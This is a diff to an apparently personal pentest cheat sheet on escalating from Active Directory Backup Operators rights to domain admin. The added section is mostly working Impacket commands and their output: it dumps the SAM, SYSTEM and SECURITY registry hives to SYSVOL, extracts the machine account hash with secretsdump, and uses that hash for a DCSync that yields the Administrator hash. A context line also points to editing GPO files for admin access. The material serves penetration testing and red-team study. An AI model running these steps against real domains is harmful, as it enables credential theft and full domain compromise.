@@ -126,7 +126,7 @@ echo "Y" | wbadmin start recovery -version:10/09/2023-23:48 -itemtype:file -item
 
 When Exploit ok, download ntds.dit in `C:\`.
 
-# Change GPO files
+# AD - Change GPO files
 
 You can change `GptTmpl.inf` file, wait GPO Update and got admin, [Details see Here](https://www.inguardians.com/wp-content/uploads/2020/04/BackupOperators-1.pdf).
 
@@ -142,6 +142,40 @@ robocopy "\\DC\SYSVOL\megabank.local\Policies\{xxxxxxxxxxxxxxx}\MACHINE\Microsof
 
 # Write file
 robocopy "." "\\DC\SYSVOL\megabank.local\Policies\{xxxxxxxxxxxxxxx}\MACHINE\Microsoft\Windows NT\SecEdit" GptTmpl.inf /b
+```
+
+# AD - BackupOperatorToDA
+
+Use this [BackupOperatorToDA](https://github.com/mpgn/BackupOperatorToDA) but no stable.
+
+This is same as use `reg.py` dump same into `SYSVOL` and use machine hash to dcsync. 
+
+```
+$ reg.py 'backup$'@192.168.24.10 -hashes ":xxxxxxxxxxxxxx" backup -o '\\DC\SYSVOL'   
+Impacket v0.13.0.dev0+20241127.154729.af51dfd - Copyright Fortra, LLC and its affiliated companies 
+
+[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
+[*] Saved HKLM\SAM to \\primary\SYSVOL\SAM.save
+[*] Saved HKLM\SYSTEM to \\primary\SYSVOL\SYSTEM.save
+[*] Saved HKLM\SECURITY to \\primary\SYSVOL\SECURITY.save
+
+$ smbclient.py 'backup$'@192.168.24.10 -hashes :xxxxxxxxxxxxxx
+# use SYSVOL
+# ls
+drw-rw-rw-          0  Wed Dec  4 15:11:40 2024 .
+drw-rw-rw-          0  Wed Dec  4 15:11:40 2024 ..
+drw-rw-rw-          0  Tue Jan 28 00:49:17 2020 manesec.com
+-rw-rw-rw-      49152  Wed Dec  4 15:11:35 2024 SAM.save
+-rw-rw-rw-      36864  Wed Dec  4 15:11:40 2024 SECURITY.save
+-rw-rw-rw-   14823424  Wed Dec  4 15:11:38 2024 SYSTEM.save
+
+# Dump machine hash
+$ secretsdump.py -sam SAM.save -system SYSTEM.save -security SECURITY.save local
+$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:9be2f2d89df4c2ac986eff89010ade94
+
+# Use machine hash to DCsync
+$ secretsdump.py PRIMARY\$@192.168.24.10 -hashes ":9be2f2d89df4c2ac986eff89010ade94"
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:xxxxxxxxxxxxxxx:::
 ```
 
 
